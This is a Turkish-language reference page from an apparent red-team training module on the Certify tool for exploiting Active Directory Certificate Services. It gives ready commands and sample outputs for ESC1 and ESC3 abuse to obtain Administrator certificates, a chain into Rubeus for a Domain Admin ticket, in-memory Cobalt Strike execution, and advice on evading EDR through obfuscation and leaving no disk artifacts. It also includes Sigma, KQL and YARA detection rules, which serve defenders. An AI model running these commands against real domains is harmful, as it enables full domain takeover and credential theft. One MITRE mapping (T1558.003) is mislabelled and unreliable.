# Certify

> **Kategori:** [8. Active Directory Sertifika Servisleri](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Will Schroeder (@harmj0y) ve Lee Christensen (@tifkin_) tarafından GhostPack ailesi kapsamında geliştirilen; Active Directory Sertifika Servisleri (AD CS) altyapısında zafiyetli sertifika şablonlarını (ESC1-ESC4 vb.) LDAP üzerinden listeleyen ve DCOM/RPC (`ICertRequestD2`) protokolü ile ayrıcalıklı hesaplar adına sertifika talep eden C# tabanlı sömürü aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında kimlik doğrulama altyapısı tarihsel olarak Kerberos ve NTLM protokollerine dayanırken, kurumsal ağların büyümesiyle birlikte akıllı kart oturum açma, VPN kimlik doğrulama, S/MIME e-posta şifreleme ve makine kimlik doğrulaması amacıyla **Active Directory Sertifika Servisleri (AD CS)** yaygın olarak devreye alınmıştır. Haziran 2021'de SpecterOps araştırmacıları Will Schroeder ve Lee Christensen tarafından yayımlanan *"Certified Pre-Owned"* başlıklı araştırma, yanlış yapılandırılmış sertifika şablonlarının ve sertifika yetkililerinin (CA), saldırganların herhangi bir domain kullanıcısından dakikalar içinde Domain Admin (DA) yetkisine yükselmesine imkan tanıdığını ortaya koymuştur.

**`Certify`**, bu araştırmanın operasyonel silahıdır. Windows işletim sisteminde C# (.NET) ile sıfırdan geliştirilmiş olup, herhangi bir üçüncü parti kütüphaneye ihtiyaç duymadan doğrudan Windows API'leri ve Dizin Hizmetleri (`System.DirectoryServices`) üzerinden çalışır.

### Temel Çalışma Mekanizması

1. **LDAP Üzerinden PKI Keşfi:** Etki alanındaki Yapılandırma Adlandırma Bağlamı'nı (`CN=Configuration,DC=domain,DC=local`) sorgular:
   - `CN=Enrollment Services,CN=Public Key Services,...` altındaki Enterprise CA sunucularını bulur.
   - `CN=Certificate Templates,CN=Public Key Services,...` altındaki tüm sertifika şablonlarını çeker.
2. **Bayrak ve ACL Analizi (ESC Tespiti):**
   - **`msPKI-Certificate-Name-Flag`:** `ENROLLEE_SUPPLIES_SUBJECT` (0x00000001) bayrağının açık olup olmadığını kontrol eder (Sertifikayı talep edenin Subject Alternative Name - SAN belirleyebilmesi).
   - **`pKIExtendedKeyUsage` (EKU):** İstemci Kimlik Doğrulaması (`1.3.6.1.5.5.7.3.2 - Client Authentication`), Akıllı Kartla Oturum Açma (`1.3.6.1.4.1.311.20.2.2`), Herhangi Bir Amaç (`2.5.29.37.0`) veya Kayıt Temsilcisi (`1.3.6.1.4.1.311.20.2.1 - Certificate Request Agent`) varlığını inceler.
   - **`msPKI-Enrollment-Flag`:** Yönetici onayı (`CT_FLAG_PEND_ALL_REQUESTS`) gerekip gerekmediğini denetler.
   - **DACL / Güvenlik Tanımlayıcısı:** Düşük yetkili kullanıcıların (`Domain Users`, `Authenticated Users`) şablonda kayıt hakkına (`Enroll` / `AutoEnroll`) veya şablonu değiştirme hakkına (`WriteOwner`, `WriteDacl`, `GenericWrite`) sahip olup olmadığını denetler.
3. **RPC/DCOM Üzerinden Sertifika Talebi:** Zafiyetli bir şablon tespit edildiğinde, `ICertRequestD2` MS-ICPR arabirimi üzerinden hedef CA'ya RPC isteği gönderir ve yanıt olarak şifrelenmiş `.pem` / `.pfx` sertifikasını teslim alır.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│               SALDIRGAN / TEST MAKİNESİ (STANDART KULLANICI)           │
│                                                                        │
│  [ Certify.exe find /vulnerable ]                                      │
│         │                                                              │
│         ├── (1) LDAP Sorgusu (TCP 389/636): CN=Configuration,...       │
│         │   └── Şablonlar, EKU'lar, Enrollee Bayrakları, DACL'ler     │
│         │                                                              │
│         ▼                                                              │
│  [ ESC1 Zafiyeti Tespit Edildi: "ClientAuth" + ENROLLEE_SUPPLIES_SUBJ ]│
│         │                                                              │
│  [ Certify.exe request /ca:... /template:... /altname:Administrator ]  │
│         │                                                              │
│         ├── (2) Yerel RSA/ECC Özel Anahtarı ve CSR (PKCS#10) Üretimi   │
│         │                                                              │
│         ├── (3) MS-ICPR (RPC/DCOM TCP 135 -> Dinamik Port):           │
│         │       ICertRequestD2::Request() Gönderilir                   │
│         │                                                              │
│         ▼                                                              │
│  [ KURUMSAL SERTİFİKA YETKİLİSİ (AD CS / CA SUNUCUSU) ]               │
│         │                                                              │
│         ├── CA Talebi Doğrular, Domain Admin SAN'lı Sertifikayı İmzalar│
│         │                                                              │
│         ▼                                                              │
│  [ Certify.exe İmzalı Sertifikayı (Base64 PFX / PEM) Teslim Alır ]     │
│         │                                                              │
│         ▼ (PKINIT ile Kerberos TGT Biletine Dönüştürme)                │
│  [ Rubeus.exe asktgt /certificate:<PFX> /user:Administrator /ptt ]     │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | Klasik NTLM/Kerberos Saldırısı | AD CS / Certify Yaklaşımı | Avantaj / Operasyonel Değer |
|---|---|---|---|
| **Parola Değişikliklerine Dayanıklılık** | Parola değiştiğinde NTLM hash'i ve Kerberos bileti geçersiz kalır. | İmzalı X.509 sertifikası, kullanıcı parolası değişse bile geçerlilik süresi (1-5 yıl) boyunca çalışır. | Eşsiz kalıcılık (Persistence) sağlar; parola sıfırlamalarından etkilenmez. |
| **Log ve Tespit Yoğunluğu** | DCSync ve LSASS dökümü EDR ve SIEM alarmlarını anında tetikler. | Sertifika talebi tamamen meşru kurumsal PKI protokolleri (MS-WCCE / MS-ICPR) üzerinden akar. | EDR süreç takibini atlatır; çoğu SIEM'de sertifika olayları korele edilmez. |
| **Yetki Düzeyi Sıçraması** | Aşamalı yanal hareket ve LPE zinciri gerektirir. | Tek bir zafiyetli şablon üzerinden doğrudan Domain Administrator veya Enterprise Admin olunur. | Dakikalar içinde etki alanı seviyesinde tam kontrol (Domain Compromise). |
| **C2 Entegrasyonu** | Harici Python komut dosyaları pivot gerektirir. | Salt .NET C# yapısı sayesinde Cobalt Strike, Sliver veya Havoc'ta `execute-assembly` ile bellekte çalışır. | Diske dosya bırakmadan tamamen hafızada yürütülür. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | Certify | Certipy | ADCSKiller | PowerShell PKI |
|---|---|---|---|---|
| **Geliştirme Dili** | C# (.NET) | Python | Python | PowerShell |
| **Çalışma Platformu** | Windows (Yerel / In-Memory) | Linux / Windows | Linux / Windows | Windows (RSAT) |
| **C2 Execute-Assembly** | 🟢 Mükemmel (Native .NET) | 🔴 Desteklemez (Harici Python) | 🔴 Desteklemez | 🟡 Script Block Logging riski |
| **Sömürü Kapsamı** | ESC1 - ESC4, ESC8 (find & req) | ESC1 - ESC16 (Tüm sömürü zinciri) | ESC1 - ESC8 Otomasyonu | Yalnızca temel yönetim |
| **Yerleşik PKINIT Desteği** | 🔴 Yok (Rubeus ile birleştirilir) | 🟢 Var (`certipy auth`) | 🔴 Yok (PKINITtools gerektirir) | 🔴 Yok |
| **Hafıza İçi Ayak İzi** | Minimal, tek binary | Ağır Python bağımlılıkları | Python bağımlılıkları | Yüksek bellek ve log izi |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Certify, komut satırından ana eylem (`find`, `request`, `download`, `pkquery`) ve bunlara bağlı parametre bayrakları ile yönetilir.

### Genel Sözdizimi

```cmd
Certify.exe <Komut> [Seçenekler ve Filtreler]
```

### Temel Komutlar ve Görevleri

- **`find`:** Etki alanındaki tüm CA'ları ve sertifika şablonlarını listeler; zafiyetleri analiz eder.
- **`request`:** Belirtilen CA ve şablon üzerinden yerel RSA anahtarı üreterek sertifika talep eder.
- **`download`:** Beklemede (pending) kalan bir sertifika onaylandığında ID numarası ile sertifikayı indirir.
- **`pkquery`:** PKI nesneleri için doğrudan düşük seviyeli LDAP sorguları yürütür.

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `/vulnerable` | Yalnızca bilinen yetki yükseltme zafiyetine (ESC1, ESC2, ESC3, ESC4 vb.) sahip şablonları listeler. | `Certify.exe find /vulnerable` |
| `/ca:SUNUCU\CANAME` | Sertifika talebinin iletileceği hedef Enterprise CA'nın tam adresi. | `/ca:ca01.corp.local\Corp-CA` |
| `/template:ŞABLONADI` | İstek yapılacak sertifika şablonunun adı (`Name` özniteliği, `DisplayName` değil). | `/template:UserAuthentication` |
| `/altname:UPN` | Sertifikanın Subject Alternative Name (SAN) alanına yazılacak hedef kimlik (ESC1 temel parametresi). | `/altname:Administrator@corp.local` |
| `/onbehalfof:DOMAIN\USER` | Kayıt Temsilcisi (Enrollment Agent) sertifikası kullanarak başkası adına talep iletme (ESC3). | `/onbehalfof:CORP\Administrator` |
| `/install` | Alınan sertifikayı otomatik olarak mevcut kullanıcının Windows Sertifika Deposu'na (`My / Personal`) yükler. | `/install` |
| `/machine` | Sertifika talebini bilgisayar hesabı bağlamında (Machine context) yapar. | `/machine` |
| `/path:C:\yol\cert.pfx` | Üretilen PFX sertifikasını diske kaydeder (Belirtilmezse ekrana Base64 basar). | `/path:C:\Temp\admin.pfx` |
| `/password:PAROLA` | Üretilen PFX sertifikasını korumak için kullanılacak parola (Varsayılan: `Certify`). | `/password:Password123!` |
| `/domain:DOMAIN.LOCAL` | Sorgulanacak hedef Active Directory etki alanı. | `/domain:corp.local` |
| `/ldapFilter:FİLTRE` | Şablon aramalarında uygulanacak özel LDAP arama filtresi. | `/ldapFilter:"(name=*Auth*)"` |
| `/hideAdmins` | Yalnızca düşük yetkili kullanıcıların erişebildiği şablonları gösterir; yöneticileri gizler. | `find /vulnerable /hideAdmins` |
| `/showAllPermissions` | Şablonlar üzerindeki tüm Access Control Entry (ACE) kayıtlarını ayrıntısıyla döker. | `find /showAllPermissions` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Etki Alanında Zafiyetli Sertifika Şablonlarının Tespiti

Sızma testinde bir domain kullanıcısı ele geçirildikten sonra AD CS altyapısında yetki yükseltme yollarını denetlemek:

```cmd
Certify.exe find /vulnerable
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Tools> Certify.exe find /vulnerable

   ______   ___  __   ___  __   ___  __   ___  __
  / _____/ / _ \/ /  / _ \/ /  / _ \/ /  / _ \/ /
 / /____  /  __  /  /  __  /  /  __  /  /  __  / 
 \______/ \___/_/   \___/_/   \___/_/   \___/_/   
  v1.0.0

[*] Action: Find certificate templates
[*] Using current user context
[*] Searching for vulnerable certificate templates...

CA Name                               : ca01.corp.local\Corp-CA
Template Name                         : WebClientAuthentication
Schema Version                        : 2
Validity Period                       : 1 year
Renewal Period                        : 6 weeks
msPKI-Certificate-Name-Flag           : ENROLLEE_SUPPLIES_SUBJECT
pKIExtendedKeyUsage                   : Client Authentication, Server Authentication
Requires Manager Approval             : False
Requires Key Archival                 : False
Authorized Signatures Required        : 0

[!] Vulnerabilities:
    ESC1: 'Domain Users' group has enrollment permissions and enrollee supplies subject alternative name!

Enrollment Permissions:
    Enrollment Rights                 : CORP\Domain Users
                                        CORP\Domain Computers
    Extended Rights                   : CORP\Domain Users
```

*Çıktı Yorumu:* `WebClientAuthentication` şablonunda `msPKI-Certificate-Name-Flag` değeri `ENROLLEE_SUPPLIES_SUBJECT` içerir, `Client Authentication` EKU'su vardır, yönetici onayı kapalıdır ve `Domain Users` grubunun kayıt hakkı vardır. Bu durum açık bir **ESC1 (Yetki Yükseltme)** zafiyetidir.

### Senaryo 2: ESC1 Sömürüsü — Domain Administrator Adına Sertifika Talep Etme

Tespit edilen `WebClientAuthentication` şablonu kullanılarak `Administrator` adına bir X.509 istemci sertifikası talep edilmesi:

```cmd
Certify.exe request /ca:ca01.corp.local\Corp-CA /template:WebClientAuthentication /altname:Administrator@corp.local
```

**Örnek Konsol Çıktısı Analizi:**

```text
[*] Action: Request a certificate
[*] Target CA        : ca01.corp.local\Corp-CA
[*] Target Template  : WebClientAuthentication
[*] Alternative Name : Administrator@corp.local

[*] Generating 2048-bit RSA key pair...
[*] Creating certificate signing request (CSR)...
[*] Submitting request to CA...
[+] Successfully requested certificate!
[*] Certificate Request ID: 142

[+] Issued Certificate Subject   : CN=jdoe, OU=Users, DC=corp, DC=local
[+] Alternative Name (SAN)       : Administrator@corp.local
[+] Certificate Serial Number    : 4F0000008E12A3B4C5D6E7F8
[+] Certificate Validity         : 10/14/2026 12:00:00 PM to 10/14/2027 12:00:00 PM

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0r1f... [Kırpıldı] ...X9yT
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIFjTCCBHWgAwIBAgIT... [Kırpıldı] ...J2kQ==
-----END CERTIFICATE-----

[*] Converting certificate and private key to PFX format...
[+] Base64 PFX password: Certify
[+] Base64 PFX:
    MIIKbAIBAzCCCV8GCSqGSIb3DQEHAaCCCV... [Base64 PFX Verisi] ...==
```

*Çıktı Yorumu:* CA sunucusu isteği onaylamış ve içerisinde `Administrator@corp.local` UPN kimliğini barındıran geçerli bir sertifika üretmiştir. Certify bunu ekrana Base64 PFX olarak basar.

### Senaryo 3: Sertifikayı Kerberos TGT'ye Dönüştürme (Rubeus ile AD Domain Admin Ele Geçirme)

Certify ile elde edilen Base64 PFX verisi, Kategori 06 aracı [Rubeus](../Kategori_06_Kerberos_Protokol_Cephaneligi/Rubeus.md) kullanılarak PKINIT üzerinden Domain Admin TGT biletine dönüştürülür ve mevcut oturuma enjekte edilir (`/ptt`):

```cmd
Rubeus.exe asktgt /certificate:MIIKbAIBAzCCCV8GCSq...== /password:Certify /user:Administrator /domain:corp.local /dc:dc01.corp.local /ptt
```

Bu komuttan sonra `klist` çalıştırıldığında `Administrator@CORP.LOCAL` TGT biletinin oturumda aktif olduğu görülür; artık etki alanı genelinde tam Domain Admin yetkisi elde edilmiştir.

### Senaryo 4: ESC3 Sömürüsü — Kayıt Temsilcisi (Enrollment Agent) ile Zincirleme Talep

Bir şablonda `Certificate Request Agent` EKU'su varsa:
1. Önce bu şablondan bir Enrollment Agent sertifikası alınır:
   ```cmd
   Certify.exe request /ca:ca01.corp.local\Corp-CA /template:EnrollmentAgent
   ```
2. Ardından bu sertifika Windows deposuna yüklenip `/onbehalfof` bayrağı ile kısıtlı şablonlardan Administrator adına sertifika talep edilir:
   ```cmd
   Certify.exe request /ca:ca01.corp.local\Corp-CA /template:UserAuth /onbehalfof:CORP\Administrator /enrollmentcert:agent.pfx
   ```

### Senaryo 5: Beklemede Kalan (Pending) Sertifikayı İndirme

Şablonda yönetici onayı (`Requires Manager Approval = True`) açıksa veya CA isteği beklemeye aldıysa:

```cmd
Certify.exe download /ca:ca01.corp.local\Corp-CA /id:142
```

Sertifika yetkilisi operatörü veya bir zafiyet sonucu talep onaylandığında, Request ID belirtilerek onaylanmış sertifika çekilir.

### Senaryo 6: C2 Bellek İçi Yürütme (Cobalt Strike / Sliver)

Diske `.exe` yazmaktan kaçınarak EDR dosya tarama mekanizmalarını atlatmak için Beacon konsolundan bellek içi yürütme:

```text
beacon> execute-assembly /opt/GhostPack/Certify.exe find /vulnerable /hideAdmins
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `CERTSRV_E_BAD_REQUESTSTATUS (0x80094001)` / Request Under Submission | Şablon yapılandırmasında `Requires Manager Approval` bayrağı etkindir; sertifika hemen imzalanmamış, CA yöneticisinin onay kuyruğuna düşmüştür. | Talep ID numarası kaydedilmeli; CA yöneticisi isteği onayladıktan sonra `Certify.exe download /id:<ID>` komutu ile çekilmelidir veya yönetici onayı gerektirmeyen başka bir şablon hedeflenmelidir. |
| `The RPC server is unavailable (0x800706BA)` | Hedef CA sunucusunda RPC portu (TCP 135) veya MS-ICPR dinamik RPC portları yerel/ağ güvenlik duvarı tarafından engellenmektedir. | Ağ bağlantısı `Test-NetConnection -ComputerName <CA> -Port 135` ile test edilmeli; RPC engelliyse HTTP üzerinden CES/CEP veya NDES web kayıt servisleri hedeflenmelidir (ESC8). |
| `CERTSRV_E_TEMPLATE_DENIED (0x80094012)` / The permissions on the certificate template do not allow the current user to enroll | Mevcut kullanıcının veya üyesi olduğu grupların şablonun güvenlik tanımlayıcısında (DACL) `Enroll` yetkisi yoktur. | `Certify.exe find` çıktısındaki `Enrollment Permissions` tablosu incelenmeli; mevcut kullanıcının veya bilgisayar hesabının üyesi olduğu gruplara izin veren şablonlar tercih edilmelidir. |
| `KDC_ERR_PADATA_TYPE_NOSUPP (0x10)` / PKINIT not supported | Elde edilen sertifika ile Rubeus/Certipy üzerinden TGT talep edilirken Domain Controller PKINIT desteklemediğini bildirir. | Etki Alanı Denetleyicisi (DC) üzerinde kurulu bir `Domain Controller` sertifikası yoktur; KDC PKINIT yapamaz. Sertifika Kerberos yerine Schannel LDAP (LDAPS) kimlik doğrulaması için kullanılmalıdır. |
| `Access is denied (0x80070005) on ICertRequestD2` | CA sunucusunda DCOM erişim izinleri sınırlandırılmıştır veya makine DCOM çağrılarına izin vermemektedir. | Kullanıcı kimlik bilgileri doğrulanmalı; CA DCOM izinleri yetersizse web enrollment veya LDAP relay teknikleri araştırılmalıdır. |
| `KDC_ERR_CLIENT_NAME_MISMATCH (0x4B)` | Sertifikanın SAN alanında belirtilen UPN (`Administrator@corp.local`) ile hedef DC'deki hesap öznitelikleri uyuşmamaktadır. | Hedef kullanıcının tam `userPrincipalName` veya `sAMAccountName` değeri doğrulanmalı; gerekirse etki alanı FQDN yerine NetBIOS adı ile talep yapılmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Trafiği ]      : 🟡 ORTA (LDAP sorguları ve DCOM/RPC trafiği)    │
│  [ CA Veritabanı ]   : 🔴 YÜKSEK (İmzalanan tüm sertifikalar loglanır) │
│  [ EDR Süreç İzi ]   : 🟢 DÜŞÜK (execute-assembly ile in-memory)      │
│  [ DC Logları ]      : 🔴 YÜKSEK (Event 4768 PKINIT Logon telemetrisi) │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **CA Sunucusu Olay Günlükleri (Microsoft-Windows-CertificationAuthority):**
   - **Event ID 4886:** CA tarafından yeni bir sertifika talebi alındı. (Talep eden kullanıcı, şablon adı ve talep ID içerir).
   - **Event ID 4887:** CA tarafından bir sertifika onaylandı ve yayımlandı. **Kritik İpucu:** İstek yapan kullanıcı `jdoe` iken, sertifika Subject/SAN değerinde `Administrator` yazması doğrudan ESC1 sömürüsünü kanıtlar.
   - **Event ID 4888:** CA tarafından bir sertifika talebi reddedildi (Hatalı şablon veya yetkisiz istek denemeleri).
2. **Domain Controller Güvenlik Günlükleri:**
   - **Event ID 4768 (Kerberos TGT Request):** `Pre-Authentication Type: 16` (PKINIT). Sertifika Veren (Issuer) ve Sertifika Seri Numarası DC günlüklerine kaydedilir.
3. **Uç Nokta Sysmon Günlükleri:**
   - **Event ID 1 (Process Create):** Komut satırında `find /vulnerable`, `/altname:`, `/template:` argümanlarının geçmesi.
   - **Event ID 3 (Network Connect):** Sürecin CA sunucusunun 135 ve dinamik RPC portlarına bağlantı açması.

### 5.2 Ağ ve EDR İmzaları

- **LDAP İmzası:** Dizin Hizmetlerinde `(objectCategory=pKICertificateTemplate)` ve `(objectCategory=pKIEnrollmentService)` nesnelerinin kısa sürede taranması.
- **Konsol Çıktısı:** Yüksek entropili Base64 PFX dizgilerinin standart çıktıya basılması bellek tarayıcı EDR kuralları tarafından algılanabilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1649** | Steal or Forge Authentication Certificates | Zafiyetli şablonlardan ayrıcalıklı hesaplar adına sertifika elde edilmesi. |
| **T1069.002** | Permission Groups Discovery: Domain Groups | LDAP üzerinden kayıt hakkına sahip kullanıcı ve grupların denetlenmesi. |
| **T1078.002** | Valid Accounts: Domain Accounts | İmzalı geçerli X.509 sertifikası ile meşru etki alanı hesaplarına oturum açılması. |
| **T1558.003** | Kerberos Ticket Granting Tickets | Elde edilen sertifikanın PKINIT ile TGT biletine dönüştürülmesi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **CA Veritabanında Kalıcı İz** | Talep edilen her sertifika CA veritabanında kalıcı olarak saklanır. Sızma testi tamamlandığında talep ID'si bildirilerek sertifikanın iptal edilmesi (Revoke) sağlanmalıdır. |
| **Diske PFX Dosyası Yazılması** | Asla `/path:C:\...` bayrağı ile diske `.pfx` dosyası yazmayın; çıktıyı Base64 olarak hafızada tutun ve doğrudan Rubeus'a bellekten aktarın. |
| **`find /vulnerable` Gürültüsü** | Tüm şablonları toplu sorgulamak yerine, hedef şablon biliniyorsa doğrudan spesifik şablon adı ile talepte bulunun. |
| **EDR Bellek İmzaları** | Standart GitHub derlemesini kullanmayın; fonksiyon adlarını ve banner yazılarını gizleyip (obfuscate) `execute-assembly` ile çalıştırın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Şüpheli Sertifika Talebi ve Certify CLI Argümanları Tespiti

```yaml
title: Certify AD CS Exploitation Tool Execution
id: c7149a12-8172-4b3e-9081-3298aef72101
status: experimental
description: Detects command-line arguments and process executions characteristic of GhostPack Certify tool.
author: Modul 11 Security Research
logsource:
  category: process_creation
  product: windows
detection:
  selection_flags:
    CommandLine|contains:
      - 'find /vulnerable'
      - '/altname:'
      - '/onbehalfof:'
      - 'request /ca:'
  condition: selection_flags
falsepositives:
  - Legitimate PKI administrative scripts (rarely use these exact flag syntaxes)
level: critical
tags:
  - attack.credential_access
  - attack.t1649
```

#### Microsoft Sentinel KQL Sorgusu: Olay 4887 Anormal SAN Sertifika İhracı

```kql
// Talep eden hesap ile sertifika Subject/SAN hesabının uyuşmadığı durumları yakalar (ESC1 tespiti)
SecurityEvent
| where EventID == 4887
| extend EventDataXML = parse_xml(EventData)
| extend Requester = tostring(EventDataXML.EventData.Data[0])
| extend TemplateName = tostring(EventDataXML.EventData.Data[1])
| extend SubjectName = tostring(EventDataXML.EventData.Data[2])
| extend SAN = tostring(EventDataXML.EventData.Data[3])
| where isnotempty(SAN) and Requester !has SAN
| project TimeGenerated, Computer, Requester, TemplateName, SubjectName, SAN
| order by TimeGenerated desc
```

#### YARA Kuralı: Certify Derlenmiş .NET Binary ve String Tespiti

```yara
rule PostExploit_Certify_GhostPack {
    meta:
        description = "Detects compiled Certify .NET assembly, AD CS exploitation flags and namespaces"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "Certify.Domain" ascii
        $s2 = "ENROLLEE_SUPPLIES_SUBJECT" ascii wide
        $s3 = "msPKI-Certificate-Name-Flag" ascii wide
        $s4 = "Searching for vulnerable certificate templates" ascii wide
        $s5 = "/altname:" ascii wide
        $s6 = "ICertRequestD2" ascii wide
    condition:
        uint16(0) == 0x5A4D and (
            3 of ($s1, $s2, $s3, $s4, $s5, $s6)
        )
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Zafiyetli Sertifika Şablonlarını Listeleme
```cmd
Certify.exe find /vulnerable
```
- **Ne Yapar?** LDAP üzerinden tüm kurumsal şablonları tarar ve yalnızca sömürülebilir (ESC1-ESC4) olanları raporlar.
- **Ne Zaman Kullanılır?** İlk erişim sağlanan ortamda AD CS yetki yükseltme fırsatlarını denetlemek için.
- **Parametreler:** `/vulnerable`: Yalnızca sömürülebilir şablonları filtreler.

### Komut 2: ESC1 Sömürüsü — Domain Admin Adına Sertifika Talep Etme
```cmd
Certify.exe request /ca:CA01.corp.local\Corp-CA /template:UserAuth /altname:Administrator@corp.local
```
- **Ne Yapar?** Belirtilen şablondan SAN alanı `Administrator@corp.local` olan bir istemci kimlik doğrulama sertifikası üretir.
- **Ne Zaman Kullanılır?** `ENROLLEE_SUPPLIES_SUBJECT` zafiyeti bulunan bir şablon tespit edildiğinde doğrudan Domain Admin olmak için.
- **Parametreler:** `/ca`: CA sunucusu ve adı, `/template`: Hedef şablon, `/altname`: Kimliği taklit edilecek ayrıcalıklı hesap.

### Komut 3: Yönetici Hesaplarını Gizleyerek Şablon Tarama
```cmd
Certify.exe find /vulnerable /hideAdmins
```
- **Ne Yapar?** Yalnızca düşük yetkili kullanıcıların (`Domain Users`) kayıt hakkına sahip olduğu şablonları listeler; yönetici izinlerini filtreler.
- **Ne Zaman Kullanılır?** Çıktı gürültüsünü azaltmak ve yalnızca standart kullanıcı ile sömürülebilecek zafiyetlere odaklanmak için.
- **Parametreler:** `/hideAdmins`: Yönetici gruplarını sonuçlardan gizler.

### Komut 4: Tüm Şablon Yetkilerini (DACL) Ayrıntılı Dökme
```cmd
Certify.exe find /showAllPermissions
```
- **Ne Yapar?** Şablonlar üzerindeki tüm erişim denetim girdilerini (ACE) döker; ESC4 (Şablon Manipülasyonu) zafiyetlerini görmeyi sağlar.
- **Ne Zaman Kullanılır?** Standart kullanıcıların yazma/sahiplik hakkına sahip olduğu şablonları tespit etmek için.
- **Parametreler:** `/showAllPermissions`: Tam izin listesini basar.

### Komut 5: Alınan Sertifikayı Doğrudan Windows Deposu'na Yükleme
```cmd
Certify.exe request /ca:CA01.corp.local\Corp-CA /template:SmartCardAuth /altname:Administrator /install
```
- **Ne Yapar?** Üretilen sertifikayı geçerli kullanıcının yerel Windows sertifika deposuna otomatik olarak ithal eder.
- **Ne Zaman Kullanılır?** RDP veya tarayıcı tabanlı akıllı kart kimlik doğrulaması yapılacak senaryolarda.
- **Parametreler:** `/install`: Sertifikayı yerel depoya kurar.

### Komut 6: Bilgisayar Hesabı Bağlamında Talep İletme
```cmd
Certify.exe request /ca:CA01.corp.local\Corp-CA /template:MachineAuth /machine
```
- **Ne Yapar?** Sertifika talebini kullanıcı yerine yerel makine hesabı (`COMPUTER$`) bağlamında iletir.
- **Ne Zaman Kullanılır?** Yalnızca `Domain Computers` grubuna izin verilen şablonlar sömürülürken.
- **Parametreler:** `/machine`: Makine deposunu ve kimliğini kullanır.

### Komut 7: Kayıt Temsilcisi Olarak Başkası Adına Talep (ESC3)
```cmd
Certify.exe request /ca:CA01.corp.local\Corp-CA /template:User /onbehalfof:CORP\Administrator
```
- **Ne Yapar?** Mevcut enrollment agent sertifikasını kullanarak Administrator adına sertifika talep eder.
- **Ne Zaman Kullanılır?** Ortamda bir Enrollment Agent şablonu ele geçirildiğinde.
- **Parametreler:** `/onbehalfof`: Hedef taklit edilecek kullanıcı.

### Komut 8: Bekleyen (Pending) Sertifikayı ID ile İndirme
```cmd
Certify.exe download /ca:CA01.corp.local\Corp-CA /id:142
```
- **Ne Yapar?** CA onay kuyruğunda bekleyen ve sonradan onaylanan sertifikayı Request ID ile çeker.
- **Ne Zaman Kullanılır?** Yönetici onayı gerektiren şablonlarda istek onaylandıktan sonra sertifikayı teslim almak için.
- **Parametreler:** `/id`: CA üzerindeki talep numarası.

### Komut 9: Özel LDAP Filtresi ile Şablon Arama
```cmd
Certify.exe find /ldapFilter:"(name=*Smartcard*)"
```
- **Ne Yapar?** Yalnızca adında "Smartcard" geçen sertifika şablonlarını listeler.
- **Ne Zaman Kullanılır?** Yüzlerce şablon barındıran büyük kurumsal etki alanlarında hedefli arama yapmak için.
- **Parametreler:** `/ldapFilter`: Özel RFC 2254 LDAP filtre dizesi.

### Komut 10: Üretilen Sertifikayı Diske Parola Korumalı Kaydetme
```cmd
Certify.exe request /ca:CA01.corp.local\Corp-CA /template:ESC1Template /altname:da_admin@corp.local /path:C:\Temp\da.pfx /password:Pwned2026!
```
- **Ne Yapar?** Üretilen PFX sertifikasını belirtilen parola ile şifreleyerek diske yazar.
- **Ne Zaman Kullanılır?** Sertifikayı farklı bir sisteme veya Linux analiz makinesine taşımak gerektiğinde.
- **Parametreler:** `/path`: Hedef dosya yolu, `/password`: PFX şifreleme parolası.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [GhostPack / Certify](https://github.com/GhostPack/Certify)
- **SpecterOps Araştırma Makalesi:** [Certified Pre-Owned: Abusing Active Directory Certificate Services](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- **Whitepaper PDF:** [SpecterOps AD CS Whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- **MITRE ATT&CK Referansı:** [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)

---

> **Önceki:** [← lazagne (Kategori 07)](../Kategori_07_Bellek_Analizi_LSASS_ve_DPAPI_Hasadi/lazagne.md) · **Sonraki:** [Certipy →](./Certipy.md)
